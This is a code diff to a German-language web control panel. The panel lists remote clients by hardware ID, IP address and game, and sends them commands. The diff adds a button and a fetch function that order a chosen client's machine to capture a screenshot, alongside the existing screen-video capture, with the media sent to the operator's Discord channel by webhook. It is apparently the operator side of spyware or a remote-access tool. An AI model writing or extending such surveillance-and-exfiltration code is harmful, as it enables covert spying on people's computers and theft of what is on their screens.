@@ -217,7 +217,7 @@
 
             <div class="modal-tabs">
                 <button class="modal-tab-btn active" onclick="switchModalTab('info', this)">💻 System Info (msinfo32)</button>
-                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)">🎥 Discord Screen-Record</button>
+                <button class="modal-tab-btn" onclick="switchModalTab('stream', this)">🎥 Discord Media-Erfassung</button>
             </div>
 
             <div id="modal-tab-info" class="modal-tab-pane active">
@@ -237,9 +237,10 @@
 
             <div id="modal-tab-stream" class="modal-tab-pane">
                 <div class="card" style="margin-bottom:0;">
-                    <h2>🎥 DISCORD WEBHOOK VIDEO-AUFNAHME</h2>
-                    <p style="font-size:11px; color:#777799; margin-bottom:15px;">Fordere ein MP4-Video des Clients an. Das Video wird direkt an deinen Discord-Kanal übertragen, ohne Render-Traffic zu verbrauchen.</p>
-                    <label>Aufnahme-Dauer wählen</label>
+                    <h2>🎥 DISCORD WEBHOOK // MEDIA-ERFASSUNG</h2>
+                    <p style="font-size:11px; color:#777799; margin-bottom:15px;">Fordere ein Video oder einen Screenshot des Clients an. Die Medien werden direkt an deinen Discord-Kanal übertragen.</p>
+                    
+                    <label>Aufnahme-Dauer (Nur für Video)</label>
                     <select id="m-record-duration" style="margin-bottom:15px;">
                         <option value="30">30 Sekunden</option>
                         <option value="60">1 Minute</option>
@@ -248,7 +249,11 @@
                         <option value="240">4 Minuten</option>
                         <option value="300">5 Minuten</option>
                     </select>
-                    <button onclick="requestDiscordRecord()" style="background:#00adb5; width:100%; padding:12px;">🎥 Aufnahme starten & an Discord senden</button>
+
+                    <div style="display: flex; gap: 10px;">
+                        <button onclick="requestDiscordRecord()" style="background:#00adb5; flex: 1; padding:12px;">🎥 Video anfordern</button>
+                        <button onclick="requestDiscordScreenshot()" style="background:#ff0055; flex: 1; padding:12px;">📸 Screenshot senden</button>
+                    </div>
                 </div>
             </div>
 
@@ -545,7 +550,7 @@
                             <td>${u.hwid ? u.hwid : 'Disk-OK'}</td>
                             <td style="color:#00f3ff;">${u.ip}</td>
                             <td style="color:var(--accent-color);">${u.game}</td>
-                            <td><button class="btn-secondary" style="padding: 3px 8px; font-size: 10px;">Inspect & Record</button></td>
+                            <td><button class="btn-secondary" style="padding: 3px 8px; font-size: 10px;">Inspect & Media</button></td>
                         </tr>
                     `;
                 });
@@ -612,7 +617,26 @@
             })
             .then(res => res.json())
             .then(() => {
-                alert(`Aufnahme für ${duration} Sekunden angefordert! Das Video erscheint in Kürze in deinem Discord-Kanal.`);
+                alert(`Video-Aufnahme für ${duration} Sekunden angefordert!`);
+                closeUserModal();
+            });
+        }
+
+        function requestDiscordScreenshot() {
+            if (!currentStreamUser) return;
+
+            fetch(`${RENDER_URL}/api/admin/send_command`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    desktop: currentStreamUser,
+                    command: 'screenshot',
+                    duration: 0
+                })
+            })
+            .then(res => res.json())
+            .then(() => {
+                alert(`Screenshot erfolgreich angefordert! Das Bild kommt direkt in Discord.`);
                 closeUserModal();
             });
         }
